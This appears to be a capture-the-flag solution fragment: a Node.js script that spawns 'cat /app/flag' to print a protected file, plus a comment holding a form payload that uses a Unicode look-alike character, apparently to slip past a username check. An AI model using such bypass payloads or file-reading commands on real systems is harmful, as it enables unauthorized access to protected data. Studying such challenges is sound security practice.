const { spawn } = require('child_process');
const cmd = spawn('cat', ['/app/flag']);
//id=%E2%84%AAorea_pocas&pw=a&name=a&rpw=a
cmd.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

cmd.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

cmd.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});